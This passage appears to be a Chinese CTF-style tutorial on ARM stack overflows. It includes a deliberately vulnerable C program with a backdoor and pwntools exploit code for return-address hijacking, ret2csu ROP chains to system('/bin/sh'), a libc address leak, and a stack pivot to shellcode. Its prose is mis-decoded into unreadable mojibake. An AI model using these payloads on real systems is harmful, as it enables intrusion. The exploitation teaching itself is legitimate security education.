<p>ã€€ã€€Q    ARM architecture v5E only sticky flag</p>
<p>è¿˜æœ‰BEQã€BNE</p>

        <h2 id="2-éå¶å­å‡½æ•°æº¢å‡º"   >
          <a href="#2-éå¶å­å‡½æ•°æº¢å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-éå¶å­å‡½æ•°æº¢å‡º" class="headerlink" title="2.éå¶å­å‡½æ•°æº¢å‡º"></a>2.éå¶å­å‡½æ•°æº¢å‡º</h2>
      
        <h3 id="1-æ ˆæ¨¡å‹"   >
          <a href="#1-æ ˆæ¨¡å‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ ˆæ¨¡å‹" class="headerlink" title="(1)æ ˆæ¨¡å‹"></a>(1)æ ˆæ¨¡å‹</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨é‡Šå¤´</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">| 	Last FP   | </span><br><span class="line">+-------------+</span><br><span class="line">| return_addr |&lt;- frame pointer</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>

<p>å…ˆå‹å…¥LRï¼Œå†å‹å…¥FPï¼Œå½“å‰çš„FPæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ä¸ºLRä¿å­˜çš„è¿”å›åœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103144726.png" alt="image-20211103144720968"></p>

        <h3 id="2-é¢˜ç›®ï¼š"   >
          <a href="#2-é¢˜ç›®ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é¢˜ç›®ï¼š" class="headerlink" title="(2)é¢˜ç›®ï¼š"></a>(2)é¢˜ç›®ï¼š</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,name,<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello! &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;PIG-007!&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my world!I am PIG-007!&quot;</span>);</span><br><span class="line">    myFunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨ï¼š"   >
          <a href="#3-åˆ©ç”¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨ï¼š" class="headerlink" title="(3)åˆ©ç”¨ï¼š"></a>(3)åˆ©ç”¨ï¼š</h3>
      <p>ä¸€èˆ¬è€Œè¨€éƒ½æ˜¯ä¸å­˜åœ¨PIEçš„</p>

        <h4 id="A-åé—¨"   >
          <a href="#A-åé—¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-åé—¨" class="headerlink" title="A.åé—¨"></a>A.åé—¨</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">backDoor = <span class="number">0x1050C</span></span><br><span class="line"></span><br><span class="line">fake_FP = <span class="number">0xdeadbeef</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(backDoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h4 id="B-ROPé“¾æ¡"   >
          <a href="#B-ROPé“¾æ¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-ROPé“¾æ¡" class="headerlink" title="B.ROPé“¾æ¡"></a>B.ROPé“¾æ¡</h4>
      
        <h5 id="ğŸ”ºæ³¨æ„ï¼š"   >
          <a href="#ğŸ”ºæ³¨æ„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨æ„ï¼š" class="headerlink" title="ğŸ”ºæ³¨æ„ï¼š"></a>ğŸ”ºæ³¨æ„ï¼š</h5>
      <p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œåœ¨æˆ‘çš„GDBè°ƒè¯•æ—¶ï¼Œæ‰“å°å‡ºæ¥çš„å‡½æ•°åœ°å€å’ŒçœŸå®çš„å‡½æ•°åœ°å€ä¸ä¸€æ ·ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211104115048.png" alt="image-20211104115041178"></p>
<p>ä¸Šé¢0x2101cæ˜¯systemçš„gotè¡¨åœ°å€ï¼Œå¯æ˜¯å’ŒGDBæ‰“å°çš„å‡½æ•°åœ°å€ä¸ä¸€æ ·ï¼Œä½†æ˜¯å®é™…ä¸Šlibc.soæ–‡ä»¶æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºå¯ä»¥æ­£å¸¸getshellã€‚ä¹‹åå’¨è¯¢äº†luckyå¸ˆå‚…ä¹‹åï¼Œåœ¨å®¤å‹çš„å¸®åŠ©ä¸‹ï¼Œç¼–è¯‘äº†å„ä¸ªç‰ˆæœ¬çš„armæ¶æ„ä¸‹çš„glibcï¼Œå†é€šè¿‡qemuåŠ è½½è¿è¡Œåº“å°±æ­£å¸¸äº†ã€‚</p>

        <h5 id="åŠ«æŒæ ˆæ¨¡å‹ï¼š"   >
          <a href="#åŠ«æŒæ ˆæ¨¡å‹ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŠ«æŒæ ˆæ¨¡å‹ï¼š" class="headerlink" title="åŠ«æŒæ ˆæ¨¡å‹ï¼š"></a>åŠ«æŒæ ˆæ¨¡å‹ï¼š</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  Last FP    | </span><br><span class="line">+-------------+</span><br><span class="line">|gadgets_addr | &lt;- frame pointer(return_addr)</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶"   >
          <a href="#A-æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶" class="headerlink" title="A.æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶"></a>A.æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶</h5>
      
        <h6 id="a-å­˜åœ¨pop-r0-pc"   >
          <a href="#a-å­˜åœ¨pop-r0-pc" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-å­˜åœ¨pop-r0-pc" class="headerlink" title="a.å­˜åœ¨pop {r0,*, pc}"></a>a.å­˜åœ¨<code>pop &#123;r0,*, pc&#125;</code></h6>
      <p>å½“æœ‰<code>pop &#123;r0,*, pc&#125;</code>è¿™ç§gadgetï¼Œå½“ç„¶å°±æ˜¯æƒ³æ€ä¹ˆç”¨å°±æ€ä¹ˆç”¨ï¼Œä½†æ²¡æœ‰çš„æ—¶å€™å¯ä»¥ç”¨å¸¸è§çš„CSUæ¥æ›¿ä»£ã€‚</p>

        <h6 id="b-åˆ©ç”¨csu"   >
          <a href="#b-åˆ©ç”¨csu" class="heading-link"><i class="fas fa-link"></i></a><a href="#b-åˆ©ç”¨csu" class="headerlink" title="b.åˆ©ç”¨csu"></a>b.åˆ©ç”¨csu</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨é‡Šå¤´</span><br><span class="line"></span><br><span class="line">.text:0001049C                 LDR     R3, [R5],#4                 â‘¡</span><br><span class="line">.text:000104A0                 MOV     R2, R9</span><br><span class="line">.text:000104A4                 MOV     R1, R8</span><br><span class="line">.text:000104A8                 MOV     R0, R7</span><br><span class="line">.text:000104AC                 BLX     R3                          â‘¢</span><br><span class="line">.text:000104B0                 CMP     R6, R4</span><br><span class="line">.text:000104B4                 BNE     loc_10498</span><br><span class="line">.text:000104B8                 LDMFD   SP!, &#123;R4-R10,PC&#125;            â‘ </span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±æ˜¯å¾ˆæ­£å¸¸çš„ï¼Œé€šè¿‡â‘ æ¥ä¸ºR4-R10èµ‹å€¼ï¼Œä»¥åŠæ§åˆ¶PCè·³è½¬åˆ°â‘¡ï¼Œå†åˆ©ç”¨R5åœ°å€å¯¹åº”çš„å€¼æ¥èµ‹å€¼ç»™R3å¯¹åº”è·³è½¬ï¼ŒæœŸé—´ä¹Ÿå¯é€šè¿‡R7-R8æ¥æ§åˆ¶R0-R2çš„å‚æ•°ã€‚è¿™é‡Œéœ€è¦æ»¡è¶³R5å¤„ä¿å­˜çš„æ˜¯gotè¡¨åœ°å€ï¼Œå³å°†R5èµ‹å€¼ä¸ºfunc_got_addrå³å¯ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arm_csu</span>(<span class="params">call,u_gadget1,u_gadget2,r0,r1,r2</span>):</span></span><br><span class="line">    payload = p32(u_gadget1)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(call) <span class="comment">#[r5]-&gt;r3  blx r3</span></span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(r0)</span><br><span class="line">    payload += p32(r1)</span><br><span class="line">    payload += p32(r2)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(u_gadget2)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">u_gadget1 = elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x54</span></span><br><span class="line">u_gadget2 = elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">fake_FP = start_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += arm_csu(system_got,u_gadget1,u_gadget2,binsh_addr,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>



<p>è¿™ä¸ªæ˜¯åŸºäºè°ƒç”¨äº†systemå‡½æ•°ï¼Œæ‰€ä»¥systemå‡½æ•°ä¸­çš„Gotè¡¨ä¸­å·²ç»æœ‰äº†å‡½æ•°åœ°å€ï¼ŒåŒæ ·çš„ï¼Œå½“æ²¡æœ‰æ—¶éœ€è¦æ³„éœ²åœ°å€ï¼Œé€šå¸¸è°ƒç”¨putså‡½æ•°æˆ–è€…printfå‡½æ•°å³å¯æ³„éœ²åœ°å€ï¼Œå¦‚ä¸‹ç›¸å…³è„šæœ¬</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_FP = start_addr</span><br><span class="line">payload = &quot;A&quot;*0x10</span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += arm_csu(printf_got,u_gadget1,u_gadget2,printf_got,0,0)</span><br><span class="line">payload += p32(0)*7</span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">#mulArchDbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr = u32Leakbase(0)</span><br><span class="line">libc.address = printf_addr - libc.sym[&#x27;printf&#x27;]</span><br><span class="line">system_addr = libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh_addr = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">lg(&quot;system_addr&quot;,system_addr)</span><br><span class="line">lg(&quot;binsh_addr&quot;,binsh_addr) </span><br></pre></td></tr></table></div></figure>

<p>æ§åˆ¶è¿”å›åœ°å€è¿›å…¥u_gadget1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110403.png" alt="image-20211105110402858"></p>
<p>ç„¶åæ§åˆ¶R4~R10å¯„å­˜å™¨ï¼Œè·³è½¬u_gadget2</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110734.png" alt="image-20211105110734269"></p>
<p>ç„¶åè·³è½¬gotè¡¨ä¸­å‡½æ•°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110947.png" alt="image-20211105110946942"></p>
<p>è¿™é‡Œåœ¨è°ƒç”¨CSUæ—¶ä¹Ÿéœ€è¦æ§åˆ¶R6å’ŒR4ï¼Œä¾æ®<code>CMP     R6, R4</code>ï¼Œä½¿å¾—ä¹‹åçš„<code>BNE     loc_10624</code>çŸ­è·³è½¬ä¸æˆç«‹ï¼Œè¿›å…¥åˆ°csuä¸­çš„æœ€åçš„<code>POP     &#123;R4-R10,PC&#125;</code>è¯­å¥ï¼Œè¿™æ—¶å€™å†å°†æ ˆæ§å¥½ï¼Œå°±èƒ½è¿”å›åˆ°startå‡½æ•°é‡æ–°å¼€å§‹äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105112027.png" alt="image-20211105112027065"></p>
<p>ç°åœ¨çš„æ ˆåœ¨æˆ‘ä»¬æœ€å¼€å§‹çš„æ—¶å€™å·²ç»é€šè¿‡ä»¥ä¸‹è¯­å¥æ§åˆ¶å¥½äº†ï¼Œpopä¹‹åå³å¯æ§åˆ¶pcè¿›å…¥startå‡½æ•°é‡æ–°å¼€å§‹ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(0)*7</span><br><span class="line">payload += p32(start_addr)</span><br></pre></td></tr></table></div></figure>

<p>æ³„éœ²åœ°å€ä¹‹åï¼Œå¦‚æœç¨‹åºä¸­æ²¡æœ‰è°ƒç”¨systemï¼Œé‚£ä¹ˆä¾ç„¶ä¹Ÿæ— æ³•é€šè¿‡ret2csuæ¥getshellï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä¸‹åˆ—çš„æ¥ä»£æ›¿ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125; 	#pop_R4_R10_PC</span><br><span class="line">pop &#123;r3, pc&#125; 							#pop_r3_pc</span><br><span class="line">mov r0, r7 ; blx r3						#movR0_R7_BLR3</span><br></pre></td></tr></table></div></figure>

<p>è€Œ<code>pop_R4_R10_PC</code>å’Œ<code>movR0_R7_BLR3</code>éƒ½æ˜¯csuä¸­çš„ï¼Œ<code>pop_r3_pc</code>åˆ™éå¸¸å¸¸ç”¨ï¼ŒåŸºæœ¬éƒ½æœ‰ã€‚</p>
<p>è¿™ä¸ªå°±æ˜¯å…ˆæ§R7ï¼Œåœ¨æ§R3ï¼Œæœ€åR7èµ‹ç»™R0ï¼Œè·³è½¬R3è°ƒç”¨æƒ³è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™é‡Œå°±æ˜¯<code>system(&#39;/bin/sh&#39;)</code>ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_FP = start_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(pop_R4_R10_PC)</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r4</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r5</span></span><br><span class="line">payload += p32(<span class="number">0</span>) 				<span class="comment">#r6</span></span><br><span class="line">payload += p32(binsh_addr)      <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r8</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r9</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r10</span></span><br><span class="line">payload += p32(pop_r3_pc)      	<span class="comment">#r3</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(movR0_R7_BLR3)</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œçš„systemå‡½æ•°åœ°å€å°±å¾—æ˜¯æ³„éœ²çš„çœŸå®åœ°å€äº†ï¼Œå› ä¸ºèµ‹å€¼è¿‡ç¨‹æ˜¯ç›´æ¥å¯„å­˜å™¨èµ‹å€¼ï¼Œè€Œä¸æ˜¯å–å¯„å­˜å™¨å€¼ä¸ºåœ°å€å†å–å€¼äº†ã€‚</p>
<p>è¿™é‡Œçš„fake_FPåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯ä¸‹é¢ä»‹ç»çš„å°±ä¼šæœ‰ç”¨äº†ã€‚</p>

        <h5 id="B-æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶"   >
          <a href="#B-æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶" class="headerlink" title="B.æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶"></a>B.æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶</h5>
      <p>å½“æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶ï¼Œæ¯”å¦‚åªèƒ½æº¢å‡º0x10ä¸ªå­—èŠ‚æ—¶ã€‚</p>
<p>å‚ç…§inctf2018-warmupé¢˜ç›®</p>

        <h6 id="a-åˆ©ç”¨readå‡½æ•°-shellcode"   >
          <a href="#a-åˆ©ç”¨readå‡½æ•°-shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-åˆ©ç”¨readå‡½æ•°-shellcode" class="headerlink" title="a.åˆ©ç”¨readå‡½æ•°+shellcode"></a>a.åˆ©ç”¨readå‡½æ•°+shellcode</h6>
      <p>å½“è°ƒç”¨äº†readå‡½æ•°æ—¶ï¼Œä¸”è¯¥armæ¶æ„ä½¿ç”¨qemuæ¨¡æ‹Ÿï¼Œé‚£ä¹ˆbssæ®µåŸºæœ¬éƒ½æ˜¯å¯æ‰§è¡Œçš„ã€‚(å…·ä½“åŸå› æœªçŸ¥)</p>
<p>é‚£ä¹ˆè°ƒç”¨readå‡½æ•°ä¸€èˆ¬éƒ½æ˜¯å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00010540                 MOV     R2, #0x100      ; nbytes</span><br><span class="line">.text:00010544                 MOV     R1, R3          ; buf</span><br><span class="line">.text:00010548                 MOV     R0, #0          ; fd</span><br><span class="line">.text:0001054C                 BL      read</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±å¯ä»¥é€šè¿‡èµ‹å€¼ç»™bufçš„è¯­å¥æ¥åŠ«æŒR1ï¼Œå°†shellcodeè¯»å–åˆ°æˆ‘ä»¬æƒ³æ”¾ç½®çš„ä½ç½®ï¼Œå½“ç„¶ï¼Œè¿™ä¹‹å‰è¿˜æ˜¯å¾—åŠ«æŒR3å¯„å­˜å™¨ï¼Œä¸è¿‡è¿™ä¸ªç›´æ¥é€šè¿‡å¾ˆå¸¸ç”¨çš„gadgetå³å¯ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r3, pc&#125; 							#pop_r3_pc</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode_addr = bss_addr + <span class="number">0x4</span></span><br><span class="line">fake_FP = bss_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(pop_r3_pc)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(read_gadget)</span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(p32(shellcode_addr)+shellcode)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115257.png" alt="image-20211105115257258"></p>
<p>è¿™æ ·å³å¯è¯»å–shellcodeåˆ°bssæ®µäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115432.png" alt="image-20211105115432342"></p>
<p>ä¸è¿‡è¿™ä¹Ÿéœ€è¦åŸæœ¬çš„è¯»å–å‡½æ•°è®¾ç½®çš„bufé•¿åº¦è¶³å¤Ÿæ”¾ä¸‹æˆ‘ä»¬çš„shellcodeæ‰è¡Œï¼Œå·²ç»æˆåŠŸè¯»å–</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115637.png" alt="image-20211105115637472"></p>
<p>è¿™é‡Œçš„fake_FPå°±èµ·ä½œç”¨äº†ï¼Œå› ä¸ºæˆ‘ä»¬åŠ«æŒäº†FPï¼Œæ‰€ä»¥åœ¨myFuncå‡½æ•°ï¼Œå³å­˜åœ¨æº¢å‡ºå‡½æ•°è¿”å›æ—¶ï¼Œé€šè¿‡</p>
<p><code>SUB     SP, R11, #4</code>å°†FPå‡4ä¹‹åèµ‹å€¼ç»™SPï¼Œå°±èƒ½åŠ«æŒæ ˆäº†ï¼Œ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105120321.png" alt="image-20211105120320963"></p>
<p>ä¹‹åå†é€šè¿‡<code>POP     &#123;R11,PC&#125;</code>ï¼ŒåŠ«æŒPCï¼Œè¿›å…¥åˆ°shellcodeæ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”±äºæ˜¯popç»™PCï¼Œæ‰€ä»¥bssæ®µä¸Šè¿˜æ˜¯éœ€è¦æ”¾ä¸Šå¯¹åº”shellcodeå¤„çš„åœ°å€ï¼Œæ‰€ä»¥å‘é€shellcodeçš„è¯­å¥ä¸º</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(p32(shellcode_addr)+shellcode)</span><br></pre></td></tr></table></div></figure>

<p>æœ€åæˆåŠŸgetshellã€‚</p>

        <h4 id="ğŸ”ºå­˜åœ¨PIEæ—¶"   >
          <a href="#ğŸ”ºå­˜åœ¨PIEæ—¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå­˜åœ¨PIEæ—¶" class="headerlink" title="ğŸ”ºå­˜åœ¨PIEæ—¶"></a>ğŸ”ºå­˜åœ¨PIEæ—¶</h4>
      <p>è¿™ç§ä¸€èˆ¬éƒ½æ˜¯éœ€è¦ç»“åˆçˆ†ç ´æ¥è¿›è¡Œäº†ï¼Œæˆ–è€…é¢˜ç›®æœ¬èº«æ³„éœ²åœ°å€ã€‚</p>

        <h2 id="3-å¶å­å‡½æ•°æº¢å‡º"   >
          <a href="#3-å¶å­å‡½æ•°æº¢å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å¶å­å‡½æ•°æº¢å‡º" class="headerlink" title="3.å¶å­å‡½æ•°æº¢å‡º"></a>3.å¶å­å‡½æ•°æº¢å‡º</h2>
      
        <h3 id="1-æ ˆæ¨¡å‹-1"   >
          <a href="#1-æ ˆæ¨¡å‹-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ ˆæ¨¡å‹-1" class="headerlink" title="(1)æ ˆæ¨¡å‹"></a>(1)æ ˆæ¨¡å‹</h3>
